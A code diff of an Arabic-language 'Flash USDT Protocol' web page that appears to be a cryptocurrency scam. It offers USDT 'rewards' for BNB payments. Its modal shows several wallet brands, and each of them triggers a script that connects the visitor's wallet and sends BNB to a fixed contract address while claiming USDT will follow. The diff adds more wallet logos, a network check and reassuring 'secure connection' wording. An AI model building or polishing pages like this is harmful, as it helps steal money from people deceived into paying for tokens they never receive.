@@ -3,112 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flash USDT Protocol | المكافآت الفورية</title>
+    <title>Flash USDT Protocol | بروتوكول المكافآت</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         * { box-sizing: border-box; }
         body { 
-            background: #0b0e11; 
-            color: white; 
-            font-family: 'Segoe UI', Tahoma, sans-serif; 
-            display: flex; 
-            flex-direction: column;
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            padding: 20px;
+            background: #0b0e11; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            min-height: 100vh; margin: 0; padding: 20px;
         }
         .header { text-align: center; margin-bottom: 30px; }
-        .header h1 { color: #f3ba2f; font-size: 28px; margin: 0; }
+        .header h1 { color: #f3ba2f; font-size: 28px; margin: 0; text-shadow: 0 0 10px rgba(243, 186, 47, 0.3); }
         .header p { color: #929aa5; margin-top: 10px; font-size: 15px; }
 
-        .grid { 
-            display: grid; 
-            grid-template-columns: 1fr; 
-            gap: 20px; 
-            width: 100%; 
-            max-width: 380px; 
-        }
-
+        .grid { display: grid; grid-template-columns: 1fr; gap: 20px; width: 100%; max-width: 380px; }
+        
         .plan-card { 
-            background: #181a20; 
-            border: 1px solid #474d57; 
-            border-radius: 18px; 
-            padding: 25px; 
-            text-align: center; 
-            transition: 0.3s; 
-            cursor: pointer; 
-            position: relative;
+            background: #181a20; border: 1px solid #474d57; border-radius: 18px; 
+            padding: 25px; text-align: center; transition: 0.3s; cursor: pointer; position: relative;
         }
-
         .plan-card:hover { border-color: #f3ba2f; transform: translateY(-5px); }
-
+        
+        /* حزمة VIP 1 BNB */
         .vip-card { 
             border: 2px solid #f3ba2f; 
             background: linear-gradient(145deg, #181a20, #1e2329); 
-            box-shadow: 0 0 25px rgba(243, 186, 47, 0.25);
+            box-shadow: 0 0 20px rgba(243, 186, 47, 0.2); 
         }
-
         .badge { 
-            background: #f3ba2f; 
-            color: black; 
-            font-size: 11px; 
-            font-weight: bold; 
-            padding: 5px 15px; 
-            border-radius: 20px; 
-            position: absolute; 
-            top: -12px; 
-            left: 50%;
-            transform: translateX(-50%);
+            background: #f3ba2f; color: black; font-size: 11px; font-weight: bold; 
+            padding: 5px 15px; border-radius: 20px; position: absolute; top: -12px; left: 50%; transform: translateX(-50%);
         }
 
         .amount-usdt { font-size: 32px; color: #f3ba2f; font-weight: bold; display: block; }
-        .cost-bnb { color: #ffffff; font-size: 17px; margin: 12px 0 22px 0; display: block; opacity: 0.9; }
+        .cost-bnb { color: #ffffff; font-size: 17px; margin: 12px 0 20px 0; display: block; opacity: 0.9; }
+        .btn-pay { background: #f3ba2f; color: black; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
 
-        .btn-pay { 
-            background: #f3ba2f; 
-            color: black; 
-            border: none; 
-            padding: 14px; 
-            width: 100%; 
-            border-radius: 12px; 
-            font-weight: bold; 
-            font-size: 17px; 
-            cursor: pointer; 
-        }
-
-        .modal { 
-            display: none; 
-            position: fixed; 
-            top: 0; left: 0; 
-            width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.92); 
-            z-index: 1000; 
-        }
+        /* نافذة اختيار المحافظ (Modal) */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 1000; }
         .modal-content { 
-            background: #1e2329; 
-            margin: 25% auto; 
-            padding: 25px; 
-            width: 85%; 
-            max-width: 320px; 
-            border-radius: 20px; 
-            border: 1px solid #474d57; 
-            text-align: center;
+            background: #1e2329; margin: 15% auto; padding: 25px; width: 90%; max-width: 350px; 
+            border-radius: 20px; border: 1px solid #474d57;
         }
+        .modal-content h3 { margin: 0 0 15px 0; text-align: center; color: #f3ba2f; }
+        
         .wallet-option { 
-            display: flex; 
-            align-items: center; 
-            justify-content: space-between; 
-            padding: 15px; 
-            background: #2b3139; 
-            margin: 12px 0; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            border: 1px solid transparent; 
+            display: flex; align-items: center; justify-content: space-between; 
+            padding: 12px 15px; background: #2b3139; margin: 10px 0; border-radius: 12px; 
+            cursor: pointer; border: 1px solid transparent; transition: 0.2s;
         }
-        .wallet-option:hover { border-color: #f3ba2f; }
-        .wallet-option img { width: 32px; }
+        .wallet-option:hover { border-color: #f3ba2f; background: #323841; }
+        .wallet-option span { font-weight: 500; font-size: 16px; }
+        .wallet-option img { width: 32px; height: 32px; border-radius: 6px; }
     </style>
 </head>
 <body>
@@ -141,8 +87,7 @@
 
     <div id="walletModal" class="modal">
         <div class="modal-content">
-            <h3 style="margin-top:0; color: #f3ba2f;">اتصال آمن</h3>
-            <p style="font-size: 13px; color: #929aa5;">قم بربط محفظتك لإتمام عملية التحويل</p>
+            <h3>ربط المحفظة الآمن</h3>
             
             <div class="wallet-option" onclick="executePay()">
                 <span>MetaMask</span>
@@ -154,12 +99,27 @@
                 <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg">
             </div>
 
-            <button onclick="closeModal()" style="background:none; border:none; color:gray; cursor:pointer; margin-top:15px; font-size:14px;">إلغاء</button>
+            <div class="wallet-option" onclick="executePay()">
+                <span>Binance Wallet</span>
+                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png">
+            </div>
+
+            <div class="wallet-option" onclick="executePay()">
+                <span>Coinbase Wallet</span>
+                <img src="https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg">
+            </div>
+
+            <div class="wallet-option" onclick="executePay()">
+                <span>WalletConnect</span>
+                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
+            </div>
+
+            <button onclick="closeModal()" style="background:none; border:none; color:gray; width:100%; cursor:pointer; margin-top:15px; font-size:14px;">إلغاء العملية</button>
         </div>
     </div>
 
     <script>
-        // عنوان العقد الذكي الخاص بك
+        // عنوان عقدك الذكي المثبت
         const CONTRACT_ADDRESS = "0x7325622388A2967BCaAeE94C986836EB7aB80f4E";
         let selectedAmount = "0";
 
@@ -172,35 +132,50 @@
             document.getElementById("walletModal").style.display = "none";
         }
 
+        // إغلاق النافذة عند الضغط خارجها
+        window.onclick = function(event) {
+            let modal = document.getElementById("walletModal");
+            if (event.target == modal) { closeModal(); }
+        }
+
         async function executePay() {
             if (window.ethereum) {
                 try {
                     const web3 = new Web3(window.ethereum);
+                    
+                    // طلب الاتصال بالحسابات
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const userAccount = accounts[0];
+
+                    // التأكد من شبكة BSC (الرقم 56 هو رمز شبكة Binance Smart Chain)
+                    const chainId = await web3.eth.getChainId();
+                    if (chainId !== 56 && chainId !== '0x38') {
+                        alert("يرجى تحويل شبكة المحفظة إلى Smart Chain (BSC) للمتابعة");
+                        return;
+                    }
+
                     const amountWei = web3.utils.toWei(selectedAmount, "ether");
 
+                    // إرسال المعاملة إلى العقد
                     web3.eth.sendTransaction({
-                        from: accounts[0],
+                        from: userAccount,
                         to: CONTRACT_ADDRESS,
                         value: amountWei
                     })
                     .on('transactionHash', function(hash){
-                        alert("تم إرسال طلبك! ستصلك عملات USDT فور تأكيد الشبكة.");
+                        alert("تم إرسال الطلب بنجاح! ستصلك عملات USDT فور تأكيد المعاملة على الشبكة.");
                         closeModal();
                     })
                     .on('error', function(error){
-                        alert("خطأ: يرجى التأكد من توفر رصيد كافٍ في المحفظة.");
+                        alert("حدث خطأ: تأكد من وجود رصيد كافٍ لرسوم الغاز (Gas Fees).");
                     });
+
                 } catch (error) {
-                    alert("تم إلغاء الاتصال بالمحفظة.");
+                    alert("فشل الاتصال بالمحفظة أو تم رفض العملية.");
                 }
             } else {
-                alert("يرجى فتح الموقع من متصفح محفظة Trust Wallet أو MetaMask.");
+                alert("يرجى فتح الموقع من داخل متصفح محفظة Trust Wallet أو MetaMask (DApp Browser)");
             }
-        }
-
-        window.onclick = function(event) {
-            if (event.target == document.getElementById("walletModal")) { closeModal(); }
         }
     </script>
 </body>
